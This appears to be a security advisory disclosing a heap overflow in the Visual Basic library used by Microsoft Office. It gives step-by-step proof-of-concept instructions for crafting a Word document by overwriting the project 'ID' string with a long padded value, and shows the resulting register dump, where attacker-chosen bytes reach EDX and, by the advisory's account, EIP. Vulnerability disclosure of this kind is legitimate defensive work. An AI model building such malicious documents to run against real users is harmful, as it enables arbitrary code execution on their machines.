Description:

The Visual Basic Design Time Environment library (VBE.DLL and VBE6.DLL),
used by the Microsoft Office series and other Microsoft applications,
contains an exploitable heap overflow vulnerability. If a malicious Office
file such as ".doc", ".xls", etc. is opened, there is the ability for an
attacker to execute arbitrary code. This buffer overflow bug also affects
Internet Explorer, because some Office files are executed automatically by a
helper-application when these files are received.

Technical Description:

[Technical data may wrap in eMail. Please visit our website.]

The following steps can be performed in order to create a proof-of-concept
Word document:

1. Open Word.
2. Select "Insert" - "Object"
3. Select "MSPropertyTreeCtl Class" (You can also select other objects such
as ChoiceBox Class, etc)
4. Save .doc file.
5. Modify .doc file by using binary editor as follows:

5a. Find following strings in doc file.

ID="{1FE45957-2625-4B1E-ADEF-EC04B7F34CCF}"
Document=ThisDocument/&H00000000
Name="Project"
HelpContextID="0"
VersionCompatible32="393222000"
CMG="1E1C0125015D1B611B611B611B61"
DPB="4B4954458046804680"
GC="787A679868986867"

5b. Change "ID" from:

 +0000  49 44 3D 22 7B 31 46 45 34 35 39 35 37 2D 32 36   ID="{1FE45957-26

 +0000  49 44 3D 22 7B 61 61 61 61 61 61 61 61 61 61 61   ID="{aaaaaaaaaaa
 +0010  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
 +0020  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
 +0030  61 61 61 61 41 42 43 44 00 00 00 00               aaaaABCD....

6. Open modified doc file.
7. You'll be able to see an access violation such as...

65106055 FF 52 0C   call        dword ptr [edx+0Ch]

 EAX = 023219A4 EBX = 0232194B ECX = 02311AC4
 EDX = 44434241 ESI = 0231186C EDI = 02321940
 EIP = 65106055 ESP = 0012CBA0 EBP = 0012CBB8

We can set any value to EDX register, so, we can control EIP register.
